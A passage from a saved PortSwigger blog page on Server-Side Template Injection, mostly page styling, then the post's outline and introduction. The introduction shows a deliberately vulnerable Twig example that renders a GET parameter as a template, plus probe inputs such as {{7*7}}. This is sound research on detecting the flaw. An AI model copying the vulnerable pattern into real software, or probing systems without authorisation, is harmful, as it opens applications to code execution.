<!DOCTYPE html>
<!-- saved from url=(0075)http://blog.portswigger.net/2015/08/server-side-template-injection.html?m=1 -->
<html class="v2" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0" name="viewport">

<script type="text/javascript">(function() { var b=window,f="chrome",g="tick",k="jstiming";(function(){function d(a){this.t={};this.tick=function(a,d,c){var e=void 0!=c?c:(new Date).getTime();this.t[a]=[e,d];if(void 0==c)try{b.console.timeStamp("CSI/"+a)}catch(h){}};this[g]("start",null,a)}var a;b.performance&&(a=b.performance.timing);var n=a?new d(a.responseStart):new d;b.jstiming={Timer:d,load:n};if(a){var c=a.navigationStart,h=a.responseStart;0<c&&h>=c&&(b[k].srt=h-c)}if(a){var e=b[k].load;0<c&&h>=c&&(e[g]("_wtsrt",void 0,c),e[g]("wtsrt_","_wtsrt",h),e[g]("tbsd_","wtsrt_"))}try{a=null,
b[f]&&b[f].csi&&(a=Math.floor(b[f].csi().pageT),e&&0<c&&(e[g]("_tbnd",void 0,b[f].csi().startE),e[g]("tbnd_","_tbnd",c))),null==a&&b.gtbExternal&&(a=b.gtbExternal.pageT()),null==a&&b.external&&(a=b.external.pageT,e&&0<c&&(e[g]("_tbnd",void 0,b.external.startE),e[g]("tbnd_","_tbnd",c))),a&&(b[k].pt=a)}catch(p){}})();b.tickAboveFold=function(d){var a=0;if(d.offsetParent){do a+=d.offsetTop;while(d=d.offsetParent)}d=a;750>=d&&b[k].load[g]("aft")};var l=!1;function m(){l||(l=!0,b[k].load[g]("firstScrollTime"))}b.addEventListener?b.addEventListener("scroll",m,!1):b.attachEvent("onscroll",m);
 })();</script>
<meta content="blogger" name="generator">
<link href="http://blog.portswigger.net/favicon.ico" rel="icon" type="image/x-icon">
<link href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="PortSwigger Web Security Blog - Atom" href="http://blog.portswigger.net/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="PortSwigger Web Security Blog - RSS" href="http://blog.portswigger.net/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="PortSwigger Web Security Blog - Atom" href="https://www.blogger.com/feeds/8503755746105415394/posts/default">

<link rel="alternate" type="application/atom+xml" title="PortSwigger Web Security Blog - Atom" href="http://blog.portswigger.net/feeds/1895030275483636305/comments/default">
<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1333113279-ieretrofit.js"></script>
<![endif]-->
<link href="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/pretty+methodology+diagram.png" rel="image_src">
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>PortSwigger Web Security Blog: Server-Side Template Injection</title>
<link type="text/css" rel="stylesheet" href="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/269196239-widget_css_mobile_2_bundle.css">
<link type="text/css" rel="stylesheet" href="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/authorization.css">
<style id="page-skin-1" type="text/css"><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Simple
Designer: Josh Peterson
URL:      www.noaesthetic.com
----------------------------------------------- */
/* Variable definitions
====================
<Variable name="keycolor" description="Main Color" type="color" default="#66bbdd"/>
<Group description="Page Text" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 12px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#222222"/>
</Group>
<Group description="Backgrounds" selector=".body-fauxcolumns-outer">
<Variable name="body.background.color" description="Outer Background" type="color" default="#66bbdd"/>
<Variable name="content.background.color" description="Main Background" type="color" default="#ffffff"/>
<Variable name="header.background.color" description="Header Background" type="color" default="transparent"/>
</Group>
<Group description="Links" selector=".main-outer">
<Variable name="link.color" description="Link Color" type="color" default="#2288bb"/>
<Variable name="link.visited.color" description="Visited Color" type="color" default="#888888"/>
<Variable name="link.hover.color" description="Hover Color" type="color" default="#33aaff"/>
</Group>
<Group description="Blog Title" selector=".header h1">
<Variable name="header.font" description="Font" type="font"
default="normal normal 60px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="header.text.color" description="Title Color" type="color" default="#3399bb" />
</Group>
<Group description="Blog Description" selector=".header .description">
<Variable name="description.text.color" description="Description Color" type="color"
default="#777777" />
</Group>
<Group description="Tabs Text" selector=".tabs-inner .widget li a">
<Variable name="tabs.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="tabs.text.color" description="Text Color" type="color" default="#999999"/>
<Variable name="tabs.selected.text.color" description="Selected Color" type="color" default="#000000"/>
</Group>
<Group description="Tabs Background" selector=".tabs-outer .PageList">
<Variable name="tabs.background.color" description="Background Color" type="color" default="#f5f5f5"/>
<Variable name="tabs.selected.background.color" description="Selected Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Post Title" selector="h3.post-title, .comments h4">
<Variable name="post.title.font" description="Font" type="font"
default="normal normal 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
</Group>
<Group description="Date Header" selector=".date-header">
<Variable name="date.header.color" description="Text Color" type="color"
default="#666666"/>
<Variable name="date.header.background.color" description="Background Color" type="color"
default="transparent"/>
<Variable name="date.header.font" description="Text Font" type="font"
default="normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="date.header.padding" description="Date Header Padding" type="string" default="inherit"/>
<Variable name="date.header.letterspacing" description="Date Header Letter Spacing" type="string" default="inherit"/>
<Variable name="date.header.margin" description="Date Header Margin" type="string" default="inherit"/>
</Group>
<Group description="Post Footer" selector=".post-footer">
<Variable name="post.footer.text.color" description="Text Color" type="color" default="#666666"/>
<Variable name="post.footer.background.color" description="Background Color" type="color"
default="#f9f9f9"/>
<Variable name="post.footer.border.color" description="Shadow Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Gadgets" selector="h2">
<Variable name="widget.title.font" description="Title Font" type="font"
default="normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.title.text.color" description="Title Color" type="color" default="#000000"/>
<Variable name="widget.alternate.text.color" description="Alternate Color" type="color" default="#999999"/>
</Group>
<Group description="Images" selector=".main-inner">
<Variable name="image.background.color" description="Background Color" type="color" default="#ffffff"/>
<Variable name="image.border.color" description="Border Color" type="color" default="#eeeeee"/>
<Variable name="image.text.color" description="Caption Text Color" type="color" default="#666666"/>
</Group>
<Group description="Accents" selector=".content-inner">
<Variable name="body.rule.color" description="Separator Line Color" type="color" default="#eeeeee"/>
<Variable name="tabs.border.color" description="Tabs Border Color" type="color" default="#dddddd"/>
</Group>
<Variable name="body.background" description="Body Background" type="background"
color="#ffffff" default="$(color) none repeat scroll top left"/>
<Variable name="body.background.override" description="Body Background Override" type="string" default=""/>
<Variable name="body.background.gradient.cap" description="Body Gradient Cap" type="url"
default="url(//www.blogblog.com/1kt/simple/gradients_light.png)"/>
<Variable name="body.background.gradient.tile" description="Body Gradient Tile" type="url"
default="url(//www.blogblog.com/1kt/simple/body_gradient_tile_light.png)"/>
<Variable name="content.background.color.selector" description="Content Background Color Selector" type="string" default=".content-inner"/>
<Variable name="content.padding" description="Content Padding" type="length" default="10px" min="0" max="100px"/>
<Variable name="content.padding.horizontal" description="Content Horizontal Padding" type="length" default="10px" min="0" max="100px"/>
<Variable name="content.shadow.spread" description="Content Shadow Spread" type="length" default="40px" min="0" max="100px"/>
<Variable name="content.shadow.spread.webkit" description="Content Shadow Spread (WebKit)" type="length" default="5px" min="0" max="100px"/>
<Variable name="content.shadow.spread.ie" description="Content Shadow Spread (IE)" type="length" default="10px" min="0" max="100px"/>
<Variable name="main.border.width" description="Main Border Width" type="length" default="0" min="0" max="10px"/>
<Variable name="header.background.gradient" description="Header Gradient" type="url" default="none"/>
<Variable name="header.shadow.offset.left" description="Header Shadow Offset Left" type="length" default="-1px" min="-50px" max="50px"/>
<Variable name="header.shadow.offset.top" description="Header Shadow Offset Top" type="length" default="-1px" min="-50px" max="50px"/>
<Variable name="header.shadow.spread" description="Header Shadow Spread" type="length" default="1px" min="0" max="100px"/>
<Variable name="header.padding" description="Header Padding" type="length" default="30px" min="0" max="100px"/>
<Variable name="header.border.size" description="Header Border Size" type="length" default="1px" min="0" max="10px"/>
<Variable name="header.bottom.border.size" description="Header Bottom Border Size" type="length" default="1px" min="0" max="10px"/>
<Variable name="header.border.horizontalsize" description="Header Horizontal Border Size" type="length" default="0" min="0" max="10px"/>
<Variable name="description.text.size" description="Description Text Size" type="string" default="140%"/>
<Variable name="tabs.margin.top" description="Tabs Margin Top" type="length" default="0" min="0" max="100px"/>
<Variable name="tabs.margin.side" description="Tabs Side Margin" type="length" default="30px" min="0" max="100px"/>
<Variable name="tabs.background.gradient" description="Tabs Background Gradient" type="url"
default="url(//www.blogblog.com/1kt/simple/gradients_light.png)"/>
<Variable name="tabs.border.width" description="Tabs Border Width" type="length" default="1px" min="0" max="10px"/>
<Variable name="tabs.bevel.border.width" description="Tabs Bevel Border Width" type="length" default="1px" min="0" max="10px"/>
<Variable name="post.margin.bottom" description="Post Bottom Margin" type="length" default="25px" min="0" max="100px"/>
<Variable name="image.border.small.size" description="Image Border Small Size" type="length" default="2px" min="0" max="10px"/>
<Variable name="image.border.large.size" description="Image Border Large Size" type="length" default="5px" min="0" max="10px"/>
<Variable name="page.width.selector" description="Page Width Selector" type="string" default=".region-inner"/>
<Variable name="page.width" description="Page Width" type="string" default="auto"/>
<Variable name="main.section.margin" description="Main Section Margin" type="length" default="15px" min="0" max="100px"/>
<Variable name="main.padding" description="Main Padding" type="length" default="15px" min="0" max="100px"/>
<Variable name="main.padding.top" description="Main Padding Top" type="length" default="30px" min="0" max="100px"/>
<Variable name="main.padding.bottom" description="Main Padding Bottom" type="length" default="30px" min="0" max="100px"/>
<Variable name="paging.background"
color="#ffffff"
description="Background of blog paging area" type="background"
default="transparent none no-repeat scroll top center"/>
<Variable name="footer.bevel" description="Bevel border length of footer" type="length" default="0" min="0" max="10px"/>
<Variable name="mobile.background.overlay" description="Mobile Background Overlay" type="string"
default="transparent none repeat scroll top left"/>
<Variable name="mobile.background.size" description="Mobile Background Size" type="string" default="auto"/>
<Variable name="mobile.button.color" description="Mobile Button Color" type="color" default="#ffffff" />
<Variable name="startSide" description="Side where text starts in blog language" type="automatic" default="left"/>
<Variable name="endSide" description="Side where text ends in blog language" type="automatic" default="right"/>
*/
/* Content
----------------------------------------------- */
body {
font: normal normal 12px 'Trebuchet MS', Trebuchet, Verdana, sans-serif;
color: #666666;
background: #ffffff none repeat scroll top left;
padding: 0 0 0 0;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
h2 {
font-size: 22px;
}
a:link {
text-decoration:none;
color: #2288bb;
}
a:visited {
text-decoration:none;
color: #888888;
}
a:hover {
text-decoration:underline;
color: #33aaff;
}
.body-fauxcolumn-outer .fauxcolumn-inner {
background: transparent none repeat scroll top left;
_background-image: none;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 400px;
width: 100%;
background: #ffffff none repeat scroll top left;
}
.body-fauxcolumn-outer .cap-top .cap-left {
width: 100%;
background: transparent none repeat-x scroll top left;
_background-image: none;
}
.content-outer {
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 #333333;
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
margin-bottom: 1px;
}
.content-inner {
padding: 10px 40px;
}
.content-inner {
background-color: #ffffff;
}
/* Header
----------------------------------------------- */
.header-outer {
background: transparent none repeat-x scroll 0 -400px;
_background-image: none;
}
.Header h1 {
font: normal normal 40px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
color: #000000;
text-shadow: 0 0 0 rgba(0, 0, 0, .2);
}
.Header h1 a {
color: #000000;
}
.Header .description {
font-size: 18px;
color: #000000;
}
.header-inner .Header .titlewrapper {
padding: 22px 0;
}
.header-inner .Header .descriptionwrapper {
padding: 0 0;
}
/* Tabs
----------------------------------------------- */
.tabs-inner .section:first-child {
border-top: 0 solid #dddddd;
}
.tabs-inner .section:first-child ul {
margin-top: -1px;
border-top: 1px solid #dddddd;
border-left: 1px solid #dddddd;
border-right: 1px solid #dddddd;
}
.tabs-inner .widget ul {
background: transparent none repeat-x scroll 0 -800px;
_background-image: none;
border-bottom: 1px solid #dddddd;
margin-top: 0;
margin-left: -30px;
margin-right: -30px;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .6em 1em;
font: normal normal 12px 'Trebuchet MS', Trebuchet, Verdana, sans-serif;
color: #000000;
border-left: 1px solid #ffffff;
border-right: 1px solid #dddddd;
}
.tabs-inner .widget li:first-child a {
border-left: none;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
color: #000000;
background-color: #eeeeee;
text-decoration: none;
}
/* Columns
----------------------------------------------- */
.main-outer {
border-top: 0 solid #dddddd;
}
.fauxcolumn-left-outer .fauxcolumn-inner {
border-right: 1px solid #dddddd;
}
.fauxcolumn-right-outer .fauxcolumn-inner {
border-left: 1px solid #dddddd;
}
/* Headings
----------------------------------------------- */
div.widget > h2,
div.widget h2.title {
margin: 0 0 1em 0;
font: normal bold 11px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
color: #000000;
}
/* Widgets
----------------------------------------------- */
.widget .zippy {
color: #999999;
text-shadow: 2px 2px 1px rgba(0, 0, 0, .1);
}
.widget .popular-posts ul {
list-style: none;
}
/* Posts
----------------------------------------------- */
h2.date-header {
font: normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
}
.date-header span {
background-color: #bbbbbb;
color: #ffffff;
padding: 0.4em;
letter-spacing: 3px;
margin: inherit;
}
.main-inner {
padding-top: 35px;
padding-bottom: 65px;
}
.main-inner .column-center-inner {
padding: 0 0;
}
.main-inner .column-center-inner .section {
margin: 0 1em;
}
.post {
margin: 0 0 45px 0;
}
h3.post-title, .comments h4 {
font: normal normal 22px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
margin: .75em 0 0;
}
.post-body {
font-size: 110%;
line-height: 1.4;
position: relative;
}
.post-body img, .post-body .tr-caption-container, .Profile img, .Image img,
.BlogList .item-thumbnail img {
padding: 2px;
background: #ffffff;
border: 1px solid #eeeeee;
-moz-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
-webkit-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
}
.post-body img, .post-body .tr-caption-container {
padding: 5px;
}
.post-body .tr-caption-container {
color: #666666;
}
.post-body .tr-caption-container img {
padding: 0;
background: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
box-shadow: 0 0 0 rgba(0, 0, 0, .1);
}
.post-header {
margin: 0 0 1.5em;
line-height: 1.6;
font-size: 90%;
}
.post-footer {
margin: 20px -2px 0;
padding: 5px 10px;
color: #666666;
background-color: #eeeeee;
border-bottom: 1px solid #eeeeee;
line-height: 1.6;
font-size: 90%;
}
#comments .comment-author {
padding-top: 1.5em;
border-top: 1px solid #dddddd;
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
#comments .avatar-image-container img {
border: 1px solid #eeeeee;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
}
.comments .comment-thread.inline-thread {
background-color: #eeeeee;
}
.comments .continue {
border-top: 2px solid #999999;
}
/* Accents
---------------------------------------------- */
.section-columns td.columns-cell {
border-left: 1px solid #dddddd;
}
.blog-pager {
background: transparent url(//www.blogblog.com/1kt/simple/paging_dot.png) repeat-x scroll top center;
}
.blog-pager-older-link, .home-link,
.blog-pager-newer-link {
background-color: #ffffff;
padding: 5px;
}
.footer-outer {
border-top: 1px dashed #bbbbbb;
}
/* Mobile
----------------------------------------------- */
body.mobile  {
background-size: auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
.mobile .body-fauxcolumn-outer .cap-top {
background-size: 100% auto;
}
.mobile .content-outer {
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
}
body.mobile .AdSense {
margin: 0 -0;
}
.mobile .tabs-inner .widget ul {
margin-left: 0;
margin-right: 0;
}
.mobile .post {
margin: 0;
}
.mobile .main-inner .column-center-inner .section {
margin: 0;
}
.mobile .date-header span {
padding: 0.1em 10px;
margin: 0 -10px;
}
.mobile h3.post-title {
margin: 0;
}
.mobile .blog-pager {
background: transparent none no-repeat scroll top center;
}
.mobile .footer-outer {
border-top: none;
}
.mobile .main-inner, .mobile .footer-inner {
background-color: #ffffff;
}
.mobile-index-contents {
color: #666666;
}
.mobile-link-button {
background-color: #2288bb;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile .tabs-inner .section:first-child {
border-top: none;
}
.mobile .tabs-inner .PageList .widget-content {
background-color: #eeeeee;
color: #000000;
border-top: 1px solid #dddddd;
border-bottom: 1px solid #dddddd;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #dddddd;
}

--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 960px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 960px;
max-width: 960px;
_width: 960px;
}
.main-inner .columns {
padding-left: 0;
padding-right: 0;
}
.main-inner .fauxcolumn-center-outer {
left: 0;
right: 0;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0") -
parseInt("0") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0;
}
.main-inner .fauxcolumn-right-outer {
width: 0;
}
.main-inner .column-left-outer {
width: 0;
right: 100%;
margin-left: -0;
}
.main-inner .column-right-outer {
width: 0;
margin-right: -0;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
--></style>
<script type="text/javascript">
if (window.jstiming) window.jstiming.load.tick('headEnd');
</script><script type="text/javascript" src="./PortSwigger Web Security Blog_ Server-Side Template Injection_files/google_top_exp.js"></script><style>#arrow-container {  display: none;  height: 120px;  margin-top: -60px;  overflow: hidden;  position: absolute;  width: 100%;}#arrow-container.prerender, #arrow-container.swiping {  display: block;}#left-arrow, #right-arrow {  background-color:rgb(34, 136, 187);  background-position: center center;  background-repeat: no-repeat;  display: inline-block;  height: 120px;  line-height: 120px;  position: absolute;  text-align: center;  width: 60px;}#left-arrow {  background-image: url("http://img2.blogblog.com/img/mobile-swipe-arrow-left.png");  border-radius: 0 60px 60px 0;  left: -60px;}#right-arrow {  background-image: url("http://img2.blogblog.com/img/mobile-swipe-arrow-right.png");  border-radius: 60px 0 0 60px;  right: -60px;}#left-arrow:after, #right-arrow:after {  background-color:rgb(34, 136, 187);  border: solid 2px rgb(34, 136, 187);  content: url("http://img2.blogblog.com/img/mobile-swipe-loading.gif");  display: none;  line-height: 0;  vertical-align: middle;}#arrow-container.navigating #left-arrow:after,#arrow-container.navigating #right-arrow:after {  display: inline-block;}</style></head>
<body class=" mobile variant-simplysimple">
<div class="navbar section" id="navbar" name="Navbar"><div class="widget Navbar" id="Navbar1"><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header" name="Header"><div class="widget Header" id="Header1">
<div id="header-inner">
<div class="titlewrapper">
<h1 class="title">
<a href="http://blog.portswigger.net/?m=1">PortSwigger Web Security Blog</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description"><span>
</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol" name="Cross-Column"></div>
<div class="tabs section" id="crosscol-overflow" name="Cross-Column 2"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main" name="Main"><div class="widget Blog" id="Blog1">
<div class="blog-posts hfeed">
<div class="date-outer">
<h2 class="date-header"><span>Wednesday, August 5, 2015</span></h2>
<div class="date-posts">
<div class="post-outer">
<div class="post hentry uncustomized-post-template" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<meta content="http://2.bp.blogspot.com/-AuKtbK95XLc/VayupXh78gI/AAAAAAAAAEw/VVSqLwQUrOQ/s72-c/pretty%2Bmethodology%2Bdiagram.png" itemprop="image_url">
<meta content="8503755746105415394" itemprop="blogId">
<meta content="1895030275483636305" itemprop="postId">
<a name="1895030275483636305"></a>
<h3 class="post-title entry-title" itemprop="name">
Server-Side Template Injection
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content" id="post-body-1895030275483636305" itemprop="articleBody">
<div>
Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for&nbsp;Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.<br>
<br>
Template Injection can arise both through developer error, and through the intentional exposure of templates in an attempt to offer rich functionality, as commonly done by wikis, blogs, marketing applications and content management systems. Intentional template injection is such a common use-case that many template engines offer a 'sandboxed' mode for this express purpose. This paper defines a methodology for detecting and exploiting template injection, and shows it being applied to craft RCE zerodays for two widely deployed enterprise web applications. Generic exploits are demonstrated for five of the most popular template engines, including escapes from sandboxes whose entire purpose is to handle user-supplied templates in a safe way.<br><br>
This research is also available as a <a href="https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf">printable whitepaper</a>.<br>
<h2>
Outline</h2>
<ul id="toc">
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#introduction">Introduction</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Methodology">Methodology</a></li>
<ul>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Detect">Detect</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Identify">Identify</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Exploit">Exploit</a></li>
</ul>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Exploit Development">Exploit Development</a>
 <ul>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#FreeMarker">FreeMarker</a></li>
<li>
    <a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Velocity">Velocity</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Smarty">Smarty</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Twig">Twig</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Jade">Jade</a></li>
</ul>
</li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Alfresco">Case Studies</a>
 <ul>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Alfresco">Alfresco</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#XWiki Enterprise">XWiki Enterprise</a></li>
</ul>
</li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Mitigations">Mitigations</a></li>
<li><a href="https://www.blogger.com/blogger.g?blogID=8503755746105415394#Conclusion">Conclusion</a></li>
</ul>
<div class="page-break">
</div>
<h2>
<a href="https://www.blogger.com/null" name="introduction">Introduction</a></h2>
Web applications frequently use template systems such as <a href="http://twig.sensiolabs.org/">Twig</a> and <a href="http://freemarker.org/">FreeMarker</a> to embed dynamic content in web pages and emails. Template Injection occurs when user input is embedded in a template in an unsafe manner. Consider a marketing application that sends bulk emails, and uses a Twig template to greet recepients by name. If the name is merely passed in to the template, as in the following example, everything works fine:<br>
<div class="code-box">
$output = $twig-&gt;render("<strong>Dear {first_name},</strong>", array("first_name" =&gt; $user.first_name) ); </div>
However, if users are allowed to customize these emails, problems arise: <br>
<div class="code-box">
$output = $twig-&gt;render(<b>$_GET['custom_email']</b>, 
array("first_name" =&gt; $user.first_name) );</div>
In this example the user controls the content of the template itself via the <span class="code">custom_email</span> GET parameter, rather than a value passed into it. This results in an XSS vulnerability that is hard to miss. However, the XSS is just a symptom of a subtler, more serious vulnerability. This code actually exposes an expansive but easily overlooked attack surface. The output from the following two greeting messages hints at a server-side vulnerability:<br>
<div class="code-box">
custom_email={{7*7}}<br>
<br>
49</div>
<div class="code-box">
custom_email={{self}}<br>
<br>
Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string</div>
